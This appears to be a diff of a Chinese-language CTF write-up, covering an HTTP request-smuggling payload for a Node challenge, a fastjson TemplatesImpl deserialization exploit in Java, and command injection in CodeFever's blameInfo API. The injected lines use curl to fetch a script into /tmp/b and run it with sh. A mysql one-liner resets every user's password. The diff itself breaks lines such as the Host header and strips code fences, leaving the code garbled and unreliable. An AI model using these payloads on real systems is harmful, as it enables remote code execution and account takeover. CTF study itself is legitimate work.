@@ -50,7 +50,8 @@ real_ez_node
 payload = ''' HTTP/1.1
 
 POST /copy HTTP/1.1
-Host: 127.0.0.1:3000
+Host: 127.0.0.1:
+3000
 Connection: close
 Content-Type: application/json
 Content-Length: 152
@@ -205,7 +206,9 @@ real world git
 
 rkey和u_key会进行权限检测。但是由于是我们自己账号创建的仓库。所以必定有权限。跟进getBlameInfo
 
-简单来说就是第一个不可控。第二个Command:run可控。然后Command:wrapArgument会过滤所有空格符号。暂时没绕。
+简单来说就是第一个不可控。第二个Command:
+run可控。然后Command:
+wrapArgument会过滤所有空格符号。暂时没绕。
 
 跟进Run方法。发现将数组里的参数都implode起来。加上了空格。就可以构造参数1 参数2绕过空格的过滤
 
@@ -223,7 +226,8 @@ mysql -uroot -proot -e 'use codefever_community;update cc_users set u_pa
 payload = ''' HTTP/1.1
 
 POST /copy HTTP/1.1
-Host: 127.0.0.1:3000
+Host: 127.0.0.1:
+3000
 Connection: close
 Content-Type: application/json
 Content-Length: 152
@@ -241,11 +245,6 @@ def payload_encode(raw):
 
 payload = payload_encode(payload)
 print(payload)
-```
-
-
-
-```
 import com.alibaba.fastjson.JSONArray;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -334,11 +333,6 @@ public class exp {
                       }
                       }
                       }
-```
-
-
-
-```
 import com.sun.org.apache.xalan.internal.xsltc.DOM;
 import com.sun.org.apache.xalan.internal.xsltc.TransletException;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
@@ -367,18 +361,8 @@ public class test extends com.sun.org.apache.xalan.internal.xsltc.runtime.Ab
 
     }
 }
-```
-
-
-
-```
 /api/repository/blameInfo?repository=rkey&revision=;`curl&path=xxxx>/tmp/b
 /api/repository/blameInfo?repository=rkey&revision=;`sh&path=/tmp/b
-```
-
-
-
-```
 mysql -uroot -proot -e 'use codefever_community;update cc_users set u_password="25e4826df708c36b367cc3eb32130820"'
 ```
 
